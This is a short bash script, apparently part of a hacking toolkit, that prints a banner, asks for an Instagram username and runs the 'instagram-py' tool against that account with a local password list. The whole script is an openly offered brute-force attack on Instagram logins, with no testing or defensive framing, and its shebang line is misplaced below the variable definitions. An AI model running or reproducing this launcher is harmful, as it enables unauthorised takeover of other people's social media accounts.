#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
bash main/banner.sh

echo -e '\033[1;92m'
read -p "[#] User Name : " usrnm
echo
 
instagram-py --username $usrnm --password-list pass/password.txt
 
echo
echo -e  "\033[1;92mExiting......$rset"
echo
sleep 1.0
cd $HOME
sleep 1.0
